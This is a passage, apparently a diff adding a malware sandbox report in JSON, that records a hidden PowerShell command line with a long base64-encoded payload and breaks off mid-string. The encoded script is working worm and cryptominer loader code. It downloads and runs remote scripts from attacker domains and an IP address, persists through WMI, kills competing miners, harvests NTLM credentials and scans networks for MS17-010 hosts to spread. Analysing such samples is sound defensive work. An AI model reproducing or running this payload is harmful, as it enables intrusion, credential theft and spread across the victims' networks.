+                        "powershell.exe",
+                        "-NoP",
+                        "-NonI",
+                        "-W",
+                        "Hidden",
+                        "-E",
+                        "JABzAGUAPQBAACgAJwB1AHAAZABhAHQAZQAuAHcAaQBuAGQAbwB3AHMAZABlAGYAZQBuAGQAZQByAGgAbwBzAHQALgBjAGwAdQBiACcALAAnAGkAbgBmAG8ALgB3AGkAbgBkAG8AdwBzAGQAZQBmAGUAbgBkAGUAcgBoAG8AcwB0AC4AYwBsAHUAYgAnACwAJwA4ADcALgAxADIAMQAuADkAOAAuADIAMQA1ACcAKQANAAoAJABuAGkAYwA9ACcAdwB3AHcALgB3AGkAbgBkAG8AdwBzAGQAZQBmAGUAbgBkAGUAcgBoAG8AcwB0AC4AYwBsAHUAYgAnAA0ACgBmAG8AcgBlAGEAYwBoACgAJAB0ACAAaQBuACAAJABzAGUAKQANAAoAewANAAoAIAAgACAAIAAkAHAAaQBuAD0AdABlAHMAdAAtAGMAbwBuAG4AZQBjAHQAaQBvAG4AIAAkAHQADQAKACAAIAAgACAAaQBmACAAKAAkAHAAaQBuACAALQBuAGUAIAAkAG4AdQBsAGwAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAJABuAGkAYwA9ACQAdAANAAoAIAAgACAAIAAgACAAIAAgAGIAcgBlAGEAawANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgAkAG4AaQBjAD0AJABuAGkAYwArACIAOgA4ADAAMAAwACIADQAKACQAdgBlAHIAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AJABuAGkAYwAvAHYAZQByAC4AdAB4AHQAIgApAC4AVAByAGkAbQAoACkAIAANAAoAaQBmACgAJAB2AGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAewAgAA0ACgAgACAAIAAgAGkAZgAoACQAdgBlAHIAIAAtAG4AZQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAgACcAcgBvAG8AdABcAGQAZQBmAGEAdQBsAHQAOgBjAG8AcgBlAGQAcAB1AHMAcwB2AHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAdgBlAHIAJwBdAC4AVgBhAGwAdQBlACkAewAgAA0ACgAgACAAIAAgACAAIAAgACAASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AJABuAGkAYwAvAGkAbgBmAG8ANgAuAHAAcwAxACIAKQANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAADQAKACAAIAAgACAAfQAgAA0ACgB9AA0ACgAkAHMAdABpAG0AZQA9AFsARQBuAHYAaQByAG8AbgBtAGUAbgB0AF0AOgA6AFQAaQBjAGsAQwBvAHUAbgB0AA0ACgAkAGYAdQBuAHMAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBmAHUAbgBzACcAXQAuAFYAYQBsAHUAZQAgACAAIAAgACAAIAAgACAADQAKACQAZABlAGYAdQBuAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABmAHUAbgBzACkAKQANAAoAaQBlAHgAIAAkAGQAZQBmAHUAbgANAAoADQAKAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIABfAF8ARgBpAGwAdABlAHIAVABvAEMAbwBuAHMAdQBtAGUAcgBCAGkAbgBkAGkAbgBnACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAHIAbwBvAHQAXABzAHUAYgBzAGMAcgBpAHAAdABpAG8AbgAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsAJABfAC4AZgBpAGwAdABlAHIAIAAtAG4AbwB0AG0AYQB0AGMAaAAgACcAUwB5AHMAdABlAG0AIABFAHYAZQBuAHQAcwAgAEwAbwBnACcAfQAgAHwAUgBlAG0AbwB2AGUALQBXAG0AaQBPAGIAagBlAGMAdAANAAoAJABkAGkAcgBwAGEAdABoAD0AJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAKwAnAFwAcwB5AHMAdABlAG0AMwAyACcAIAAgACAADQAKAGkAZgAgACAAKAAhACgAdABlAHMAdAAtAHAAYQB0AGgAIAAkAGQAaQByAHAAYQB0AGgAIAApACkAewANAAoACQAkAGQAaQByAHAAYQB0AGgAPQAkAGUAbgB2ADoAUwB5AHMAdABlAG0AUgBvAG8AdAANAAoAfQANAAoAaQBmACAAKAAhACgAdABlAHMAdAAtAHAAYQB0AGgAIAAoACQAZABpAHIAcABhAHQAaAArACcAXABtAHMAdgBjAHAAMQAyADAALgBkAGwAbAAnACkAKQApAA0ACgANAAoAewBzAGUAbgB0AGYAaQBsAGUAIAAoACQAZABpAHIAcABhAHQAaAArACcAXABtAHMAdgBjAHAAMQAyADAALgBkAGwAbAAnACkAIAAnAHYAYwBwACcAfQANAAoAaQBmACAAKAAhACgAdABlAHMAdAAtAHAAYQB0AGgAIAAoACQAZABpAHIAcABhAHQAaAArACcAXABtAHMAdgBjAHIAMQAyADAALgBkAGwAbAAnACkAKQApAA0ACgB7AHMAZQBuAHQAZgBpAGwAZQAgACgAJABkAGkAcgBwAGEAdABoACsAJwBcAG0AcwB2AGMAcgAxADIAMAAuAGQAbABsACcAKQAgACcAdgBjAHIAJwB9AA0ACgANAAoAWwBhAHIAcgBhAHkAXQAkAHAAcwBpAGQAcwA9ACAAZwBlAHQALQBwAHIAbwBjAGUAcwBzACAALQBuAGEAbQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgAHwAcwBvAHIAdAAgAGMAcAB1ACAALQBEAGUAcwBjAGUAbgBkAGkAbgBnAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7ACQAXwAuAGkAZAB9AA0ACgAkAHQAYwBwAGMAbwBuAG4AIAA9ACAAbgBlAHQAcwB0AGEAdAAgAC0AYQBuAG8AcAAgAHQAYwBwACAADQAKACQAZQB4AGkAcwB0AD0AJABGAGEAbABzAGUADQAKAGkAZgAgACgAJABwAHMAaQBkAHMAIAAtAG4AZQAgACQAbgB1AGwAbAAgACkADQAKAHsADQAKACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAJAB0ACAAaQBuACAAJAB0AGMAcABjAG8AbgBuACkADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAbABpAG4AZQAgAD0AJAB0AC4AcwBwAGwAaQB0ACgAJwAgACcAKQB8ACAAPwB7ACQAXwB9AA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGwAaQBuAGUAIAAtAGUAcQAgACQAbgB1AGwAbAApAA0ACgAgACAAIAAgACAAIAAgACAAewBjAG8AbgB0AGkAbgB1AGUAfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAKAAkAHAAcwBpAGQAcwBbADAAXQAgAC0AZQBxACAAJABsAGkAbgBlAFsALQAxAF0AKQAgAC0AYQBuAGQAIAAkAHQALgBjAG8AbgB0AGEAaQBuAHMAKAAiAEUAUwBUAEEAQgBMAEkAUwBIAEUARAAiACkAIAAtAGEAbgBkACAAKAAkAHQALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAOAAwACAAIgApACAALQBvAHIAIAAkAHQALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAMQA0ADQANAA0ACIAKQApACAAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAZQB4AGkAcwB0AD0AJAB0AHIAdQBlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHIAZQBhAGsADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAH0ADQAKAH0ADQAKAEsAaQBsAGwAQgBvAHQAKAAnAGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkADQAKAGYAbwByAGUAYQBjAGgAIAAoACQAdAAgAGkAbgAgACQAdABjAHAAYwBvAG4AbgApAA0ACgAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAGwAaQBuAGUAIAA9ACQAdAAuAHMAcABsAGkAdAAoACcAIAAnACkAfAAgAD8AewAkAF8AfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAIQAoACQAbABpAG4AZQAgAC0AaQBzACAAWwBhAHIAcgBhAHkAXQApACkAewBjAG8AbgB0AGkAbgB1AGUAfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAKAAkAGwAaQBuAGUAWwAtADMAXQAgAC0AbgBlACAAJABuAHUAbABsACkAIAAtAGEAbgBkACAAJAB0AC4AYwBvAG4AdABhAGkAbgBzACgAIgBFAFMAVABBAEIATABJAFMASABFAEQAIgApACAALQBhAG4AZAAgACgAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAMQAxADEAMQAiACkAIAAtAG8AcgAgACQAbABpAG4AZQBbAC0AMwBdAC4AYwBvAG4AdABhAGkAbgBzACgAIgA6ADIAMgAyADIAIgApACAALQBvAHIAIAAkAGwAaQBuAGUAWwAtADMAXQAuAGMAbwBuAHQAYQBpAG4AcwAoACIAOgAzADMAMwAzACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANAA0ADQANAAiACkAIAAtAG8AcgAgACQAbABpAG4AZQBbAC0AMwBdAC4AYwBvAG4AdABhAGkAbgBzACgAIgA6ADUANQA1ADUAIgApACAALQBvAHIAIAAkAGwAaQBuAGUAWwAtADMAXQAuAGMAbwBuAHQAYQBpAG4AcwAoACIAOgA2ADYANgA2ACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANwA3ADcANwAiACkAIAAtAG8AcgAgACQAbABpAG4AZQBbAC0AMwBdAC4AYwBvAG4AdABhAGkAbgBzACgAIgA6ADgAOAA4ADgAIgApACAALQBvAHIAIAAkAGwAaQBuAGUAWwAtADMAXQAuAGMAbwBuAHQAYQBpAG4AcwAoACIAOgA5ADkAOQA5ACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoAMQA0ADQAMwAzACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANAA1ADUANgAwACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANgA1ADMAMwAzACIAKQAgAC0AbwByACAAJABsAGkAbgBlAFsALQAzAF0ALgBjAG8AbgB0AGEAaQBuAHMAKAAiADoANQA1ADMAMwA1ACIAKQApACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGUAdgBpAGQAPQAkAGwAaQBuAGUAWwAtADEAXQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAARwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBpAGQAIAAkAGUAdgBpAGQAIAB8ACAAcwB0AG8AcAAtAHAAcgBvAGMAZQBzAHMAIAAtAGYAbwByAGMAZQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAaQBmACAAKAAhACQAZQB4AGkAcwB0ACAALQBhAG4AZAAgACgAJABwAHMAaQBkAHMALgBjAG8AdQBuAHQAIAAtAGwAZQAgADgAKQApAA0ACgB7ACAAIAAgAA0ACgAgACAAIAAgACQAYwBtAGQAbQBvAG4APQAiAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAE4AbwBQACAALQBOAG8AbgBJACAALQBXACAASABpAGQAZABlAG4AIABgACIAYAAkAG0AbwBuACAAPQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAgACcAcgBvAG8AdABcAGQAZQBmAGEAdQBsAHQAOgBjAG8AcgBlAGQAcAB1AHMAcwB2AHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAbQBvAG4AJwBdAC4AVgBhAGwAdQBlADsAYAAkAGYAdQBuAHMAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBmAHUAbgBzACcAXQAuAFYAYQBsAHUAZQAgADsAaQBlAHgAIAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAGAAJABmAHUAbgBzACkAKQApADsASQBuAHYAbwBrAGUALQBDAG8AbQBtAGEAbgBkACAAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAGAAJABSAGUAbQBvAHQAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAQAAoAGAAJABtAG8AbgAsACAAYAAkAG0AbwBuACwAIAAnAFYAbwBpAGQAJwAsACAAMAAsACAAJwAnACwAIAAnACcAKQBgACIAIgANAAoAIAAgACAAIAAkAHYAYgBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMAbwBtAE8AYgBqAGUAYwB0ACAAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAANAAoACQAkAHYAYgBzAC4AcgB1AG4AKAAkAGMAbQBkAG0AbwBuACwAMAApACAAIAANAAoAfQANAAoADQAKACQATgBUAEwATQA9ACQARgBhAGwAcwBlAA0ACgAkAG0AaQBtAGkAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBtAGkAbQBpACcAXQAuAFYAYQBsAHUAZQAgAA0ACgAkAGEALAAgACQATgBUAEwATQA9ACAARwBlAHQALQBjAHIAZQBkAHMAIAAkAG0AaQBtAGkAIAAkAG0AaQBtAGkADQAKACAAIAAgACAAIAAgACAADQAKACQATgBlAHQAdwBvAHIAawBzACAAPQAgAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIABXAGkAbgAzADIAXwBOAGUAdAB3AG8AcgBrAEEAZABhAHAAdABlAHIAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgAgAC0ARQBBACAAUwB0AG8AcAAgAHwAIAA/ACAAewAkAF8ALgBJAFAARQBuAGEAYgBsAGUAZAB9ACAAIAAgACAADQAKACQAaQBwAHMAdQAgAD0AIAAoAFsAVwBtAGkAQwBsAGEAcwBzAF0AIAAnAHIAbwBvAHQAXABkAGUAZgBhAHUAbAB0ADoAYwBvAHIAZQBkAHAAdQBzAHMAdgByACcAKQAuAFAAcgBvAHAAZQByAHQAaQBlAHMAWwAnAGkAcABzAHUAJwBdAC4AVgBhAGwAdQBlACAADQAKACQAaQAxADcAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBpADEANwAnAF0ALgBWAGEAbAB1AGUADQAKACQAcwBjAGIAYQA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBzAGMAJwBdAC4AVgBhAGwAdQBlAA0ACgBbAGIAeQB0AGUAWwBdAF0AJABzAGMAPQBbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABzAGMAYgBhACkAIAAgACAAIAAgAA0ACgBmAG8AcgBlAGEAYwBoACAAKAAkAE4AZQB0AHcAbwByAGsAIABpAG4AIAAkAE4AZQB0AHcAbwByAGsAcwApACAADQAKAHsAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAADQAKACAAIAAgACAAJABJAFAAQQBkAGQAcgBlAHMAcwAgACAAPQAgACQATgBlAHQAdwBvAHIAawAuAEkAcABBAGQAZAByAGUAcwBzAFsAMABdACAAIAANAAoACQBpAGYAIAAoACQASQBQAEEAZABkAHIAZQBzAHMAIAAtAG0AYQB0AGMAaAAgACcAXgAxADYAOQAuADIANQA0ACcAKQB7AGMAbwBuAHQAaQBuAHUAZQB9ACAACQANAAoAIAAgACAAIAAkAFMAdQBiAG4AZQB0AE0AYQBzAGsAIAAgAD0AIAAkAE4AZQB0AHcAbwByAGsALgBJAFAAUwB1AGIAbgBlAHQAWwAwAF0AIAAgAA0ACgAgACAAIAAgACQAaQBwAHMAPQBHAGUAdAAtAE4AZQB0AHcAbwByAGsAUgBhAG4AZwBlACAAJABJAFAAQQBkAGQAcgBlAHMAcwAgACQAUwB1AGIAbgBlAHQATQBhAHMAawANAAoACQAkAHQAYwBwAGMAbwBuAG4AIAA9ACAAbgBlAHQAcwB0AGEAdAAgAC0AYQBuAG8AcAAgAHQAYwBwACAADQAKAAkAZgBvAHIAZQBhAGMAaAAgACgAJAB0ACAAaQBuACAAJAB0AGMAcABjAG8AbgBuACkADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAbABpAG4AZQAgAD0AJAB0AC4AcwBwAGwAaQB0ACgAJwAgACcAKQB8ACAAPwB7ACQAXwB9AA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAhACgAJABsAGkAbgBlACAALQBpAHMAIABbAGEAcgByAGEAeQBdACkAKQB7AGMAbwBuAHQAaQBuAHUAZQB9AA0ACgAJAAkAaQBmACAAKAAkAGwAaQBuAGUALgBjAG8AdQBuAHQAIAAtAGwAZQAgADQAKQB7AGMAbwBuAHQAaQBuAHUAZQB9AA0ACgAJAAkAJABpAD0AJABsAGkAbgBlAFsALQAzAF0ALgBzAHAAbABpAHQAKAAnADoAJwApAFsAMABdAA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAgACgAJABsAGkAbgBlAFsALQAyAF0AIAAtAGUAcQAgACcARQBTAFQAQQBCAEwASQBTAEgARQBEACcAKQAgAC0AYQBuAGQAIAAgACgAJABpACAALQBuAGUAIAAnADEAMgA3AC4AMAAuADAALgAxACcAKQAgAC0AYQBuAGQAIAAoACQAaQBwAHMAIAAtAG4AbwB0AGMAbwBuAHQAYQBpAG4AcwAgACQAaQApACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGkAcABzACsAPQAkAGkADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgAH0ADQAKACAAIAAgACAAaQBmACAAKAAoAFsARQBuAHYAaQByAG8AbgBtAGUAbgB0AF0AOgA6AFQAaQBjAGsAQwBvAHUAbgB0AC0AJABzAHQAaQBtAGUAKQAvADEAMAAwADAAIAAtAGcAdAAgADUANAAwADAAKQB7AGIAcgBlAGEAawB9AA0ACgAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoACQAaQBwACAAaQBuACAAJABpAHAAcwApAA0ACgAgACAAIAAgAHsAIAAgACAADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACgAWwBFAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoAVABpAGMAawBDAG8AdQBuAHQALQAkAHMAdABpAG0AZQApAC8AMQAwADAAMAAgAC0AZwB0ACAANQA0ADAAMAApAHsAYgByAGUAYQBrAH0ADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAaQBwACAALQBlAHEAIAAkAEkAUABBAGQAZAByAGUAcwBzACkAewBjAG8AbgB0AGkAbgB1AGUAfQAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACgAVABlAHMAdAAtAEMAbwBuAG4AZQBjAHQAaQBvAG4AIAAkAGkAcAAgAC0AYwBvAHUAbgB0ACAAMQApACAALQBuAGUAIAAkAG4AdQBsAGwAIAAgAC0AYQBuAGQAIAAkAGkAcABzAHUAIAAtAG4AbwB0AGMAbwBuAHQAYQBpAG4AcwAgACQAaQBwACkAIAANAAoAIAAgACAAIAAgACAAIAAgAHsAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAD0AMAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGEALgBjAG8AdQBuAHQAIAAtAG4AZQAgADAAKQAgACAAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewAkAHIAZQAgAD0AIAB0AGUAcwB0AC0AaQBwACAALQBpAHAAIAAkAGkAcAAgAC0AYwByAGUAZABzACAAJABhACAAIAAtAG4AaQBjACAAJABuAGkAYwAgAC0AbgB0AGwAbQAgACQATgBUAEwATQAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJAByAGUAIAAtAGUAcQAgADEAKQB7ACQAaQBwAHMAdQAgAD0AJABpAHAAcwB1ACAAKwAiACAAIgArACQAaQBwAH0ADQAKAAkACQAJAGUAbABzAGUADQAKAAkACQAJAHsADQAKAAkACQAJAAkAJAB2AHUAbAA9AFsAUABpAG4AZwBDAGEAcwB0AGwAZQAuAFMAYwBhAG4AbgBlAHIAcwAuAG0AMQA3AHMAYwBdADoAOgBTAGMAYQBuACgAJABpAHAAKQAJAAkACQAJAA0ACgAJAAkACQAJAGkAZgAgACgAJAB2AHUAbAAgAC0AYQBuAGQAIAAkAGkAMQA3ACAALQBuAG8AdABjAG8AbgB0AGEAaQBuAHMAIAAkAGkAcAApAA0ACgANAAoACQAJAAkACQB7AA0ACgAJAAkACQAJAAkAJAByAGUAcwA9AGUAYgA3ACAAJABpAHAAIAAkAHMAYwANAAoACQAJAAkACQAJAGkAZgAgACgAIQAoACQAcgBlAHMAIAAtAGUAcQAgACQAdAByAHUAZQApACkADQAKAAkACQAJAAkACQB7AGUAYgA4ACAAJABpAHAAIAAkAHMAYwB9AA0ACgAJAAkACQAJAAkAJABpADEANwAgAD0AIAAkAGkAMQA3ACAAKwAgACIAIAAiACsAJABpAHAADQAKAAkACQAJAAkAfQANAAoACQAJAAkAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAIAB9ACAAIAAgACAAIAAgACAADQAKACQAUwB0AGEAdABpAGMAQwBsAGEAcwBzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBNAGEAbgBhAGcAZQBtAGUAbgB0AEMAbABhAHMAcwAoACcAcgBvAG8AdABcAGQAZQBmAGEAdQBsAHQAOgBjAG8AcgBlAGQAcAB1AHMAcwB2AHIAJwApACAAIAANAAoAJABTAHQAYQB0AGkAYwBDAGwAYQBzAHMALgBTAGUAdABQAHIAbwBwAGUAcgB0AHkAVgBhAGwAdQBlACgAJwBpAHAAcwB1ACcAIAAsACQAaQBwAHMAdQApAA0ACgAkAFMAdABhAHQAaQBjAEMAbABhAHMAcwAuAFAAdQB0ACgAKQANAAoAJABTAHQAYQB0AGkAYwBDAGwAYQBzAHMALgBTAGUAdABQAHIAbwBwAGUAcgB0AHkAVgBhAGwAdQBlACgAJwBpADEANwAnACAALAAkAGkAMQA3ACkADQAKACQAUwB0AGEAdABpAGMAQwBsAGEAcwBzAC4AUAB1AHQAKAApAA=="
+                    ],
+                    "cmd_line": "powershell.exe -NoP -NonI -W Hidden -E JABzAGUAPQBAACgAJwB1AHAAZABhAHQAZQAuAHcAaQBuAGQAbwB3AHMAZABlAGYAZQBuAGQAZQByAGgAbwBzAHQALgBjAGwAdQBiACcALAAnAGkAbgBmAG8ALgB3AGkAbgBkAG8AdwBzAGQAZQBmAGUAbgBkAGUAcgBoAG8AcwB0AC4AYwBsAHUAYgAnACwAJwA4ADcALgAxADIAMQAuADkAOAAuADIAMQA1ACcAKQANAAoAJABuAGkAYwA9ACcAdwB3AHcALgB3AGkAbgBkAG8AdwBzAGQAZQBmAGUAbgBkAGUAcgBoAG8AcwB0AC4AYwBsAHUAYgAnAA0ACgBmAG8AcgBlAGEAYwBoACgAJAB0ACAAaQBuACAAJABzAGUAKQANAAoAewANAAoAIAAgACAAIAAkAHAAaQBuAD0AdABlAHMAdAAtAGMAbwBuAG4AZQBjAHQAaQBvAG4AIAAkAHQADQAKACAAIAAgACAAaQBmACAAKAAkAHAAaQBuACAALQBuAGUAIAAkAG4AdQBsAGwAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAJABuAGkAYwA9ACQAdAANAAoAIAAgACAAIAAgACAAIAAgAGIAcgBlAGEAawANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgAkAG4AaQBjAD0AJABuAGkAYwArACIAOgA4ADAAMAAwACIADQAKACQAdgBlAHIAPQAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AJABuAGkAYwAvAHYAZQByAC4AdAB4AHQAIgApAC4AVAByAGkAbQAoACkAIAANAAoAaQBmACgAJAB2AGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAewAgAA0ACgAgACAAIAAgAGkAZgAoACQAdgBlAHIAIAAtAG4AZQAgACgAWwBXAG0AaQBDAGwAYQBzAHMAXQAgACcAcgBvAG8AdABcAGQAZQBmAGEAdQBsAHQAOgBjAG8AcgBlAGQAcAB1AHMAcwB2AHIAJwApAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACcAdgBlAHIAJwBdAC4AVgBhAGwAdQBlACkAewAgAA0ACgAgACAAIAAgACAAIAAgACAASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AJABuAGkAYwAvAGkAbgBmAG8ANgAuAHAAcwAxACIAKQANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAADQAKACAAIAAgACAAfQAgAA0ACgB9AA0ACgAkAHMAdABpAG0AZQA9AFsARQBuAHYAaQByAG8AbgBtAGUAbgB0AF0AOgA6AFQAaQBjAGsAQwBvAHUAbgB0AA0ACgAkAGYAdQBuAHMAIAA9ACAAKABbAFcAbQBpAEMAbABhAHMAcwBdACAAJwByAG8AbwB0AFwAZABlAGYAYQB1AGwAdAA6AGMAbwByAGUAZABwAHUAcwBzAHYAcgAnACkALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAJwBmAHUAbgBzACcAXQAuAFYAYQBsAHUAZQAgACAAIAAgACAAIAAgACAADQAKACQAZABlAGYAdQBuAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABmAHUAbgBzACkAKQANAAoAaQBlAHgAIAAkAGQAZQBmAHUAbgANAAoADQAKAEcAZQB0AC0AVwBtAGkATwBiAGoAZQBjAHQAIABfAF8ARgBpAGwAdABlAHIAVABvAEMAbwBuAHMAdQBtAGUAcgBCAGkAbgBkAGkAbgBnACAALQBOAGEAbQBlAHMAcABhAGMAZQAgAHIAbwBvAHQAXABzAHUAYgBzAGMAcgBpAHAAdABpAG8AbgAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsAJABfAC4AZgBpAGwAdABlAHIAIAAtAG4AbwB0AG0AYQB0AGMAaAAgACcAUwB5AHMAdABlAG0AIABFAHYAZQBuAHQAcwAgAEwAbwBnACcAfQAgAHwAUgBlAG0AbwB2AGUALQBXAG0AaQBPAGIAagBlAGMAdAANAAoAJABkAGkAcgBwAGEAdABoAD0AJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAKwAnAFwAcwB